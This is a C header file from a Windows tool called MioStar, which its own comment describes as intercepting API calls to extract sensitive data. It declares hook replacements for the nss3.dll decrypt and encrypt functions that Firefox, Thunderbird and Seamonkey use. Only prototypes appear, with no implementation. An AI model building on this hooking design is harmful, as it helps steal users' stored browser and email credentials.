/*
 * Tool name   : MioStar
 * Description : Tool to intercept API calls and to extract sensitive data.
 * Version     : 0.2
 * Date        : 11.17.2010
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 11.17.2010 nss3.dll to intercept Firefox, Thunderbird + Seamonkey crypt/decrypt calls
 *
 *
 * License     :
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */






#include <windows.h>
#include "MioStar.h"


#ifndef _MOZILLAREPLACEMENT_H
#define _MOZILLAREPLACEMENT_H

/*
 * nss3.dll:PK11SDR_Decrypt
 * nss3.dll:PK11SDR_Encrypt
 */

SECStatus MyFFDecrypt(SECItem *data, SECItem *result, void *cx);
SECStatus MyFFEncrypt(SECItem *keyid, SECItem *data, SECItem *result, void *cx);

typedef SECStatus (*MYFFDECRYPT) (SECItem *data, SECItem *result, void *cx);
typedef SECStatus (*MYFFENCRYPT) (SECItem *keyid, SECItem *data, SECItem *result, void *cx);
#endif
